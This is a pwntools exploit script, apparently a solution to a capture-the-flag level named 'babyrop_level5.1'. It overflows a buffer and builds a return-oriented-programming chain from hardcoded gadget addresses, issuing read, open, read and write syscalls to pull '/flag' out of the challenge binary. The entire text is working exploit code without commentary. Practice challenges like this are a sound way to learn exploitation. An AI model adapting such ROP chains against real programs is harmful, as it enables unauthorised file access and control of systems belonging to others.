from pwn import *

pop_rax = 0x4014ef
pop_rdi = 0x40150f
pop_rsi = 0x401527
pop_rdx = 0x4014f7
syscall = 0x40151f
buffer = 0x404000
r = process('/challenge/babyrop_level5.1')


payload = b'/'.ljust(0x28,b'\x00')
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x10) + p64(syscall) ## write /flag to 0x404000
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) #open 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall) #read 
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall) #write
r.send(payload)
r.send(b'/flag')

r.interactive()